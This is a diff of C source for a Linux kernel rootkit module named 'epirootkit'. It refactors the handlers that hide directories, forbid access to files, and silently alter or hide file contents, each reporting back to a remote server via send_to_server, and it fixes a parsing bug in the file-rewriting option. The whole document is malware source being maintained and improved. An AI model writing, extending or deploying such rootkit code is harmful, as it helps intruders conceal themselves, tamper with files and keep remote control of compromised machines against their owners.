@@ -4,10 +4,10 @@
 #include <linux/slab.h>
 #include <linux/string.h>
 
-#include "alterate.h"
+#include "alterate_api.h"
 #include "epirootkit.h"
-#include "forbid.h"
-#include "hide.h"
+#include "forbid_api.h"
+#include "hide_api.h"
 
 static int hide_dir_handler(char *args);
 static int unhide_dir_handler(char *args);
@@ -54,8 +54,8 @@ static int hooks_help(char *args) {
 static int hide_dir_handler(char *args) {
     if (!args)
         return -EINVAL;
-    int r = add_hidden_dir(args);
-    if (r == 0)
+    int r = hide_file(args);
+    if (r == SUCCESS)
         send_to_server("Hidden: %s\n", args);
     else
         send_to_server("Error hiding %s: %d\n", args, r);
@@ -65,8 +65,8 @@ static int hide_dir_handler(char *args) {
 static int unhide_dir_handler(char *args) {
     if (!args)
         return -EINVAL;
-    int r = remove_hidden_dir(args);
-    if (r == 0)
+    int r = unhide_file(args);
+    if (r == SUCCESS)
         send_to_server("Unhidden: %s\n", args);
     else
         send_to_server("Error unhide %s: %d\n", args, r);
@@ -76,8 +76,8 @@ static int unhide_dir_handler(char *args) {
 static int forbid_file_handler(char *args) {
     if (!args)
         return -EINVAL;
-    int r = add_forbidden_file(args);
-    if (r == 0)
+    int r = forbid_file(args);
+    if (r == SUCCESS)
         send_to_server("Forbidden: %s\n", args);
     else
         send_to_server("Error forbidding %s: %d\n", args, r);
@@ -87,8 +87,8 @@ static int forbid_file_handler(char *args) {
 static int unforbid_file_handler(char *args) {
     if (!args)
         return -EINVAL;
-    int r = remove_forbidden_file(args);
-    if (r == 0)
+    int r = unforbid_file(args);
+    if (r == SUCCESS)
         send_to_server("Unforbidden: %s\n", args);
     else
         send_to_server("Error unforbid %s: %d\n", args, r);
@@ -97,7 +97,7 @@ static int unforbid_file_handler(char *args) {
 
 static int list_hidden_handler(char *args) {
     char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    int len = list_hidden_dirs(buf, STD_BUFFER_SIZE);
+    int len = hide_list_get(buf, STD_BUFFER_SIZE);
     if (len <= 0)
         send_to_server("No hidden entries\n");
     else
@@ -108,7 +108,7 @@ static int list_hidden_handler(char *args) {
 
 static int list_forbidden_handler(char *args) {
     char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    int len = list_forbidden_files(buf, STD_BUFFER_SIZE);
+    int len = forbid_list_get(buf, STD_BUFFER_SIZE);
     if (len <= 0)
         send_to_server("No forbidden entries\n");
     else
@@ -119,7 +119,7 @@ static int list_forbidden_handler(char *args) {
 
 static int list_alterate_handler(char *args) {
     char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    int len = list_modified_files(buf, STD_BUFFER_SIZE);
+    int len = alterate_list_get(buf, STD_BUFFER_SIZE);
     if (len <= 0)
         send_to_server("No alterate rules, sorry.\n");
     else
@@ -158,15 +158,17 @@ static int modify_file_handler(char *args) {
         }
         else if (strncmp(token, "replace=", 8) == 0) {
             pair = token + 8;
-            replace_src = kstrdup(pair, GFP_KERNEL);
-            if (!replace_src)
-                return -ENOMEM;
-            replace_dst = strsep(&pair, ":");
+
+            char *src_tok = strsep(&pair, ":");
             if (!pair) {
-                kfree(replace_src);
                 send_to_server("Usage: replace=SRC:DST\n");
                 return -EINVAL;
             }
+
+            replace_src = kstrdup(src_tok, GFP_KERNEL);
+            if (!replace_src)
+                return -ENOMEM;
+
             replace_dst = kstrdup(pair, GFP_KERNEL);
             if (!replace_dst) {
                 kfree(replace_src);
@@ -175,14 +177,14 @@ static int modify_file_handler(char *args) {
         }
     }
 
-    return add_modified_file(path, hide_line, hide_substr, replace_src, replace_dst);
+    return alterate_add(path, hide_line, hide_substr, replace_src, replace_dst);
 }
 
 static int unmodify_file_handler(char *args) {
     if (!args)
         return -EINVAL;
-    int r = remove_modified_file(args);
-    if (r == 0)
+    int r = alterate_remove(args);
+    if (r == SUCCESS)
         send_to_server("Removed: %s\n", args);
     else
         send_to_server("Error while removing %s: %d\n", args, r);
